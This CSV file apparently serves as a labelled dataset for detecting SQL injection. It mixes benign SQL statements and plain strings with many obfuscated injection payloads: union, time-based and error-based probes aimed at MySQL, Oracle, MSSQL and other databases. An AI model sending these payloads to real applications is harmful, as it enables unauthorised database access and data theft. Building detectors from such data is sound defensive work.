Query,Label
"SELECT Orders.tearsrID, Employees.bus, Employees.skin FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.promisedID ORDER BY Orders.lookID",0
(/**//**/case/**/when/**/2646/**//**/=/**//**/8520/**/then/**/2646/**/else/**/null/**/end/**//**/),1
-7675%'   )    )     )   oRDEr By 1--,1
"1'||/**//**/(/**//*!select*/'ttyt'/*!where*/3751/**/LIKE/**/3751/*!or*/7417/**/LIKE/**/(/**//*!select*/count/**//**/(/**//**/*/**//**/)/**//**//*!from*/sysibm.systables/*!as*/t1,sysibm.systables/*!as*/t2,sysibm.systables/*!as*/t3/**//**/)/**//**/--",1
1%27%0B%09%29%0B%09%C2%A0and%09make_set%C2%A0%0B%28%09%098403%0C%C2%A0%3D%09%098403%2C8899%C2%A0%09%29%0C%0B%C2%A0and%0B%0B%0C%28%0C%0C%27ojag%27%0B%09%3D%0B%09%27ojag,1
mariabel,0
1%27%20%20%29%20%20/%2A%21where%2A/9817%20%20%3D%20%209817,1
"1""/**/)  )	 and	3202	= 	like  ( 'abcdefg',upper	 (	hex	(randomblob ( 500000000/2		)  )	 		 )		 ) 	and 	 (		(	""quni""=	""quni",1
2793,0
SELECT * FROM clay WHERE shallow IN  ( SELECT enough FROM flag ),0
SELECT third ( s )  FROM about FULL OUTER JOIN,0
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0
"1""   )    )    && CHar  (  120  )  ||CHar  (  106  )  ||CHar  (  117  )  ||CHar  (  85  )    =  regexp_substring  (  repeat  (  RIGhT  (  CHar  (  9981  )  ,0  )  ,5000000000  )  ,nuLL  )   &&    (    (   ""hmun""  =  ""hmun",1
"1   )    )     )  /*!||*/7552  =    ( /*!select*/count  (  *  )  /*!from*/rdb$fields/*!as*/t1,rdb$types/*!as*/t2,rdb$collations/*!as*/t3,rdb$functions/*!as*/t4  )  /*!&&*/   (    (     (  3504  =  3504",1
"1%'/**//*!or*//**//*!char*//**//**/(/**//**/117/**//**/)/**//**/||/*!char*//**//**/(/**//**/111/**//**/)/**//**/||/*!char*//**//**/(/**//**/105/**//**/)/**//**/||/*!char*//**//**/(/**//**/100/**//**/)/**//**//**//**//*!LIKE*//**//**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//**//*!left*//**//**/(/**//**/crypt_key/**//**/(/**//**//*!char*//**//**/(/**//**/65/**//**/)/**//**/||/*!char*//**//**/(/**//**/69/**//**/)/**//**/||/*!char*//**//**/(/**//**/83/**//**/)/**//**/,/*!null*//**//**/)/**//**/,0/**//**/)/**//**/,500000000/**//**/)/**//**/,/*!null*//**//**/)/**//**//**//*!and*//**/'%'/**//**//*!LIKE*//**//**/'",1
56876281h,0
1%27%20%20%29%20%20%20where%203331%20LIKE%203331%20or%205356%20LIKE%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
"SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID",0
SELECT * FROM blue WHERE free = 'officer' LIMIT 3,0
49830,0
1'/**//**/)/**//**//**/and/**//**//**/(/**//**/select/**/*/**/from/**//**//**/(/**//**/select/**//**/(/**//**/sleep/**//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/fzno/**//**/),1
29716,0
"select/*!like*/ (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   /*!&&*/'cwuy'  =  'cwuy",1
gabriela1,0
1/**//**/)/**//**//**/where/**/5944/**//**/=/**//**/5944/**/&&/**//**//**/(/**//**/4446/**//**/=/**//**/8843/**//**/)/**//**/*8843--,1
-6611%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%208918%2C8918%23,1
1%27/%2A%2A/AND/%2A%2A/6055/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/ctxsys.drithsx.sn/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6055%2C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/chr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/112/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/106/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/SEleCT/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/CAsE/%2A%2A/WHen/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6055/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/6055/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/thEn/%2A%2A/1/%2A%2A/ElSe/%2A%2A/0/%2A%2A/end/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/FrOM/%2A%2A/dual/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/118/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/AND/%2A%2A/%27moyb%27/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/%27moyb,1
SELECT * FROM army WHERE animal = 'cutting'  OR cover = 'effort',0
select/%2A%2A/%2A/%2A%2A/from/%2A%2A/users/%2A%2A/where/%2A%2A/id/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/%271%27/%2A%2A/or/%2A%2A/%5C.%3C/%2A%2A//%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/1/%2A%2A/union/%2A%2A/select/%2A%2A/1%2C%40%40VERSION/%2A%2A/--/%2A%2A/1%27,1
"select/**/*/**/from/**/users/**/where/**/id/**//**/=/**//**/1/**/||/**/""%1""/**/||/**/1/**//**/=/**//**/1/**/--/**/1",1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205451%20%20%3D%20%205451%20%20%29%20%20%20then%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205451%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20else%20char%20%20%28%20%20108%20%20%29%20%20%7C%7Cchar%20%20%28%20%2076%20%20%29%20%20%7C%7Cchar%20%20%28%20%20112%20%20%29%20%20%7C%7Cchar%20%20%28%20%20116%20%20%29%20%20%20end%20%20%29%20%20%20from%20information_schema.system_users%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
endif,1
mota del cuervo,0
SELECT COUNT ( funny )  FROM understanding,0
"-5597'/**//**/)/**//**//*!OR*/make_set/**//**/(/**//**/2490/**//**/=/**//**/2164,2164/**//**/)",1
-4384%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20%7C%7C%206872%20%20%3D%20%206872%20%26%26%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27ukhl%27%20%20%3D%20%20%27ukhl,1
"SELECT tableID AS ID, upper AS yesterday FROM future",0
1%27%20%7C%7C%20char%20%20%28%20%2068%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205389%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20%26%26%20%27yaje%27%20%20%3D%20%20%27yaje,1
SELECT DISTINCT progress FROM animal,0
tregenza,0
33529,0
SELECT * FROM act WHERE believed = 'judge'  OR come = 'rose',0
"1""   )    )   /*!as*/hzcq/*!where*/9250/*!LIKE*/9250/*!and*/4386/*!LIKE*/utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  ( /*!select*/  ( /*!case*//*!when*/  (  4386/*!LIKE*/4386  )  /*!then*/1/*!else*/0/*!end*/ )  /*!from*/dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
SELECT * FROM wp_posts WHERE ID  =  347686 LIMIT 1,0
"SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",0
SELECT * FROM policeman WHERE property  BETWEEN 10 AND 20,0
lacoste,0
fabrs xamena,0
"1""  )  /*!as*/pgza/*!where*/8756  =  8756/*!||*/9643  =    ( /*!select*/count  (  *  )  /*!from*/domain.domains/*!as*/t1,domain.columns/*!as*/t2,domain.tables/*!as*/t3  )  --",1
SELECT * FROM pond FETCH FIRST 3 ROWS ONLY,0
corcoll duhalde,0
SELECT * FROM folks WHERE activity IN  ( SELECT frozen FROM did ),0
"SELECT EXTRACT ( MINUTE FROM ""2017-06-15 09:34:21"" ) ;",0
"minguez, 98",0
SELECT TOP 3 * FROM lesson SELECT * FROM wire 3SELECT * FROM pupil,0
SELECT * FROM slave ORDER BY wire,0
"1""  	)	) 	as	osuh	where8809	=	 8809",1
magnin_arne@tiebreak.com.sr,0
-5819%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%204144%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204144%20%20%3D%20%204144%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
1%22%20%20%29%20%20%20procedure%20analyse%20%20%28%20%20extractvalue%20%20%28%20%205840%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205840%20%20%3D%20%205840%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%2C1%20%20%29%20%20%20and%20%20%20%28%20%20%22hrkf%22%20like%20%22hrkf,1
"1""  )		as xylowhere 2112 LIKE 2112 and3715in  		(	( 	char	(		113 ) +char 	( 113)+char	(	112 ) 	+char(106 )	+char	( 113 )	 +(select			(  casewhen	(3715 LIKE 3715)	then char (	49 	) elsechar		(	48	)	end	)	) +char (	113 ) 	+char	( 122) +char	 (118	) 	+char	(		122 )	+char (	113  )  ) 	) --",1
SELECT * FROM pot WHERE bring NOT BETWEEN 'crowd' AND 'dry',0
SELECT AVG ( Price ) FROM hide,0
-9886%25%27/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/union/%2A%2A/all/%2A%2A/select/%2A%2A/5191%2C5191%2C5191%2C5191%2C5191%2C5191%2C5191--,1
"SELECT able,principal,sing FROM dear LEFT JOIN Orders ON silly.presidentID =  successful.came ORDER BY harbor.load",0
SELECT column_name ( s )  FROM table_name,0
"1'   )    )   /*!or*/8421/*!LIKE*/( /*!select*/count  (  *  )  /*!from*/generate_series  (  1,5000000   )    )   /*!and*/   (    (   'qgov'/*!LIKE*/'qgov",1
-1280%27%0C%0C%09%29%C2%A0%0C%C2%A0%0B%29%C2%A0%09%C2%A0%0COR%098571%0B%0C%3D%0C%0B8571--,1
"-9558""/*!where*/7497  =  7497 ||   (  2539  =  6484  )  *6484--",1
-7659'/**//**/)/**//**//**/as/**/bowy/**/wherE/**/4835/**//**/=/**//**/4835/**/oR/**/4747/**//**/=/**//**/dbms_utility.sqlid_to_sqlhash/**//**//**/(/**//**//**//**/(/**//**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**/SelEcT/**//**//**/(/**//**/cAsE/**/wHEN/**//**//**/(/**//**/4747/**//**/=/**//**/4747/**//**/)/**//**//**/tHEN/**/1/**/else/**/0/**/End/**//**/)/**//**//**/FROM/**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/--,1
SELECT WEEKDAY ( CURDATE (   )  )  ;,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%201105%20LIKE%201105,1
rohan,0
SELECT * FROM course WHERE sink BETWEEN '1996-07-01' AND '1996-07-31',0
"1%""andchar(120		)  ||char (	106  )||char (117	)	||char( 85		) LIKE regexp_substring	( repeat		( right(char 	(9981		)  ,0 ) ,5000000000 )		,null )and ""%"" LIKE """,1
1'  )  /*!as*/uaoz/*!where*/2464/*!LIKE*/2464,1
"1'	) as fyuh where 7608LIKE 7608&&4241	LIKE	convert(	int,	(	select	char (113	) 	+char( 113	 ) +char (	112  )		+char(106		)+char	(113	)	+	(	select(		casewhen 	(4241LIKE4241 )	 thenchar( 49)	elsechar 	(	48)		end		) 	)	+char (		113)	+char 	(  122	)	 +char( 118	) +char(122)+char(	113	)		 )		 ) 	--",1
"1""/**/ )	 	as crekwhere	6570		= 	6570and	char(  107)	 ||char	(121 )||char  (	 97 )		||char(80	) 	=  regexp_substring( 	repeat(left	 (	crypt_key ( 	char (	65  )||char (		69	)	||char	(83)	,null  )		,0 )	,500000000 )	,null)	 --",1
1%22%09and%0B7756%C2%A0%09%3D%09%0Bdbms_utility.sqlid_to_sqlhash%0B%0C%0B%28%C2%A0%C2%A0%0C%0C%28%C2%A0%C2%A0%09chr%0C%0C%28%0B%0B113%09%09%29%09%09%7C%7Cchr%09%09%28%0C%09113%0C%C2%A0%29%0C%0B%7C%7Cchr%C2%A0%C2%A0%28%C2%A0%09112%C2%A0%C2%A0%29%C2%A0%C2%A0%7C%7Cchr%0C%09%28%C2%A0%C2%A0106%0C%09%29%0C%09%7C%7Cchr%09%0C%28%0B%0B113%C2%A0%0B%29%0B%09%7C%7C%0B%C2%A0%28%09%09select%09%0C%C2%A0%28%C2%A0%0Bcase%0Bwhen%0C%09%C2%A0%28%09%097756%C2%A0%C2%A0%3D%C2%A0%C2%A07756%09%0C%29%0B%C2%A0%0Bthen%091%C2%A0else%0C0%C2%A0end%0C%0C%29%0B%09%0Cfrom%0Cdual%09%0B%29%09%09%7C%7Cchr%C2%A0%C2%A0%28%0C%C2%A0113%0C%09%29%C2%A0%C2%A0%7C%7Cchr%0C%C2%A0%28%C2%A0%09122%C2%A0%0B%29%09%09%7C%7Cchr%C2%A0%09%28%09%0C118%09%09%29%0C%0B%7C%7Cchr%09%C2%A0%28%C2%A0%C2%A0122%0B%0B%29%0B%0B%7C%7Cchr%0B%C2%A0%28%0B%09113%0B%09%09%29%0B%09%0B%09%29%09%0C%0C%0B%0B%29,1
SELECT * FROM clothes  WHERE principle NOT LIKE '[follow]%',0
esser,0
"-4695'   )    )     )   unIoN AlL seLeCT 5844,5844,5844,5844,5844,5844#",1
"1' ) )			)	or	updatexml	(1808,concat( 0x2e,0x7171706a71, 	( select(	elt  (	1808LIKE	1808,1  )  )	) ,0x717a767a71 ),8666	) 		and 	 (	 (	    ('yznn'like	'yznn",1
SELECT TOP 3 * FROM made WHERE lesson = 'frame',0
-1485%27%0B%09%09%29%0C%C2%A0%C2%A0%09%29%0C%09%09%C2%A0%0C%29%0C%C2%A0%09union%0Call%09select%0B7661%2C7661%2C7661%2C7661%2C7661--,1
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0
"-9507%"" UnIoN ALLsElEcT3342,3342,3342,3342,3342#",1
""" || """"*""",1
"1'+/**//**/(/**//**/select/**/'vfkl'/**/where/**/1713/**//**/LIKE/**//**/1713/**/and/**/8514/**//**/	LIKE/**//**//**//**/(/**//**/select/**/count/**//**/(/**//**/*/**//**/)/**//**//**/from/**/domain.domains/**/as/**/t1,domain.columns/**/as/**/t2,domain.tables/**/as/**/t3/**//**//**/)/**//**//**//**/)/**//**//**/+'",1
SELECT shells ( s )  FROM people SELECT he ( s ),0
SELECT lay ( s ) FROM question INNER JOIN,0
"1'/**/and/**/6537/**/LIKE/**/dbms_pipe.receive_message/**//**/(/**//**/chr/**//**/(/**//**/76/**//**/)/**//**/||chr/**//**/(/**//**/116/**//**/)/**//**/||chr/**//**/(/**//**/117/**//**/)/**//**/||chr/**//**/(/**//**/65/**//**/)/**//**/,5/**//**/)/**//**//**/and/**/'dubu'/**/like/**/'dubu",1
"iif  (  1157 liKE 4542,1,1/0  )",1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20order%20by%201--,1
1%20%20%29%20%20%20rlike%20sleep%20%20%28%20%205%20%20%29%20%20%23,1
ibero saborit,0
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price < 20 ) ;,0
4.34481E+15,0
"-2500'  )			))			union allselect 6853,6853,6853,6853--",1
"select * from generate_series  (  3379,3379,caSE WheN   (  3379  =  1219  )   Then 1 ELSE 0 end  )   Limit 1--",1
SELECT invented ( s )  FROM rays UNION,0
"1'   )    )     )  /*!or*/8384 LIKE /*!like*/ (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   /*!and*/   (    (     (  'jueq' LIKE 'jueq",1
64462042b,0
SELECT tin ( s )  FROM score UNION ALL,0
SELECT bean ( s )  FROM announced SELECT imagine ( s ),0
demoniaca,0
1'/**/aNd/**/4386/**//**/ LiKE /**//**/utl_inaddr.get_host_address/**//**/(/**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**/sELEcT/**//**//**/(/**//**/cASe/**/wHeN/**//**//**/(/**//**/4386/**//**/ LiKE /**//**/4386/**//**/)/**//**//**/Then/**/1/**/eLSe/**/0/**/EnD/**//**/)/**//**//**/FrOM/**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/),1
select/%2A%2A/%2A/%2A%2A/from/%2A%2A/users/%2A%2A/where/%2A%2A/id/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/%271%27/%2A%2A/or/%2A%2A/%22%22%3C%40/%2A%2A/union/%2A%2A/select/%2A%2A/1%2Cversion/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/--/%2A%2A/1%27,1
SELECT * FROM wrong WHERE arrangement IN  ( SELECT grandmother FROM tropical ),0
-3450'where 4478 LIKE 4478 ||9323 LIKE 9323#,1
-4205%27%20union%20all%20select%208986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%23,1
select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/8294/**/LIKE/**/4332/**//**/)/**//**//**/then/**/1/**/else/**/8294*/**//**/(/**//**/select/**/8294/**/from/**/master..sysdatabases/**//**/)/**//**//**/end/**//**/)/**//**/--,1
"-3361   )    )    uNION ALL select 2827,2827,2827,2827#",1
SELECT handle ( s )  FROM occur UNION,0
"SELECT Orders.enginerID, Employees.necessary, Employees.mountain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cameID ORDER BY Orders.everyoneID",0
"1'/**//**/)/**//**//**//*!or*//**/updatexml/**//**/(/**//**/1808,concat/**//**/(/**//**/0x2e,0x7171706a71,/**//**/(/**//**//*!select*//**//**//**/(/**//**/elt/**//**/(/**//**/1808/**//**/=/**//**/1808,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71/**//**/)/**//**/,8666/**//**/)/**//**//**//*!and*//**//**//**/(/**//**/'kejy'/**//**/=/**//**/'kejy",1
SELECT far ( s )  FROM fierce FULL OUTER JOIN,0
"carrer nostra sra del pilar, 101",0
SELECT * FROM rod  WHERE appearance = conversation,0
1%22/%2A%2A//*!and*//%2A%2A/3707/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//*!select*//%2A%2A/count/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/%2A/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//*!from*//%2A%2A/sysibm.systables/%2A%2A//*!as*//%2A%2A/t1%2Csysibm.systables/%2A%2A//*!as*//%2A%2A/t2%2Csysibm.systables/%2A%2A//*!as*//%2A%2A/t3/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//*!and*//%2A%2A/%22cgps%22/%2A%2A//*!like*//%2A%2A/%22cgps,1
camisoln,0
"1""  )   aS nfpe WHERe 2679  =  2679",1
SELECT option_value FROM wp_options WHERE option_name  =  'amp-options' LIMIT 1,0
magdiel,0
"-5763'		) 		)	 )  union all	select	1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",1
"1' ) )	 || row( 	1045,7562 ) > ( sElECTcount(  *) ,concat 	(0x7171706a71,( 	sElECT	(		elt  (	1045=1045,1 )	  ) 	 )	 ,0x717a767a71,floor	 (	rand  (	0		)	*2			))	x	FrOM(sElECT8488	UNIon	sElECT 5584UNIonsElECT	3051UNIonsElECT1210	)a	grouPbYx )	&& 		 (  (  'mttj'lIKE'mttj",1
-2953%22%20%20%29%20%20/%2A%21Or%2A/4493%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20/%2A%21SeLECT%2A/%20%20%28%20/%2A%21CASe%2A//%2A%21wHEN%2A/%20%20%28%20%204493%20%20%3D%20%204493%20%20%29%20%20/%2A%21thEN%2A/1/%2A%21eLSe%2A/0/%2A%21eNd%2A/%20%29%20%20/%2A%21FROM%2A/dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20/%2A%21aNd%2A/%20%20%28%20%20%22oaeh%22%20%20%3D%20%20%22oaeh,1
"-4462%""	)/*!or*/8571	= 8571--",1
-9739%27%0Cor%C2%A08571%0C%0B%3D%C2%A0%0C8571--,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%26%26%20exp%20%20%28%20%20~%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%208190%20%20%3D%20%208190%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20x%20%20%20%29%20%20%20%20%29%20%20%20%20%26%26%20%20%20%20%28%20%20%20%20%28%20%20%20%22rvuz%22%20like%20%22rvuz,1
"SELECT column_name ( s )  FROM unhappy,month",0
"SELECT * FROM operation WHERE stick BETWEEN ""generally"" AND    ""promised""",0
SELECT * FROM entire WHERE    NOT sat = 'air',0
SELECT * FROM chief WHERE morning LIKE '%force%',0
"1""/**/WHere/**/8635/**/lIKE/**/8635/**/anD/**/4595/**/lIKE/**/4595#",1
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
1%27%20anD%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20SeLecT%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20%20anD%20%27qcsi%27%20%20%3D%20%20%27qcsi,1
charlot@ringringrent.rw,0
"1'/*!IN*/boolean mode  )  /*!oR*/elt  (  5873  =  5873,/*!slEEp*/ (  5   )    )   #",1
